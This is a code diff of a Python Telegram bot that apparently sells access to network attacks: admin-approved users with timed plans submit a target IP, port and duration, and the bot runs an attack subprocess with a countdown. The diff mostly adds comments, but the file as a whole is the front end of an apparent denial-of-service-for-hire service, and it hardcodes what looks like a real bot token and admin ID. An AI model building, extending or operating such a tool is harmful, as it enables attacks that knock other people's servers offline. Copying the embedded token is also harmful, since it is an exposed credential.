@@ -5,18 +5,19 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from telegram.error import TelegramError
 
+# Bot token and admin ID setup
 TELEGRAM_BOT_TOKEN = '7245312894:AAHwIdWn7BK6qgkKIyxz4Hkk91JE8n-Vk_w'
-ADMIN_USER_ID = 6484008134  # Admin Telegram ID for approving/disapproving users
-bot_access_free = False  # Bot access is restricted
+ADMIN_USER_ID = 6484008134  # Replace with the actual admin Telegram ID
 bot_busy = False  # Track if the bot is busy with an attack
 remaining_time = 0  # Track remaining time for ongoing attack
 approved_users = {}  # Dictionary to store approved users and their plan expiration
 
+# Start command handler
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    # Check if the user is allowed to use the bot
+    # Check if the user is approved
     if user_id not in approved_users:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -33,6 +34,7 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
+# Function to run attack
 async def run_attack(chat_id, ip, port, duration, context):
     global bot_busy, remaining_time
     bot_busy = True
@@ -45,7 +47,7 @@ async def run_attack(chat_id, ip, port, duration, context):
             stderr=asyncio.subprocess.PIPE
         )
 
-        # Display countdown in remaining_time
+        # Countdown for remaining time
         while remaining_time > 0:
             await asyncio.sleep(1)
             remaining_time -= 1
@@ -65,12 +67,13 @@ async def run_attack(chat_id, ip, port, duration, context):
         remaining_time = 0
         await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
+# Attack command handler
 async def attack(update: Update, context: CallbackContext):
     global bot_busy, remaining_time
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    # Check if the user is allowed to use the bot
+    # Check if the user is approved
     if user_id not in approved_users:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -103,11 +106,12 @@ async def attack(update: Update, context: CallbackContext):
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
+# Approve command handler
 async def approve(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    # Only the admin can approve users
+    # Only admin can approve users
     if user_id != ADMIN_USER_ID:
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve users.*", parse_mode='Markdown')
         return
@@ -127,11 +131,12 @@ async def approve(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
+# Disapprove command handler
 async def disapprove(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    # Only the admin can disapprove users
+    # Only admin can disapprove users
     if user_id != ADMIN_USER_ID:
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to disapprove users.*", parse_mode='Markdown')
         return
@@ -152,6 +157,7 @@ async def disapprove(update: Update, context: CallbackContext):
     else:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ User not found in approved list.*", parse_mode='Markdown')
 
+# Background job to check for expired users
 async def check_expired_users(context: CallbackContext):
     current_time = datetime.now()
     expired_users = [user_id for user_id, data in approved_users.items() if data['expiry_date'] < current_time]
@@ -170,6 +176,7 @@ async def check_expired_users(context: CallbackContext):
         except TelegramError:
             pass  # Ignore errors if user has blocked the bot or is unreachable
 
+# Main function to run the bot
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
@@ -184,3 +191,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+        
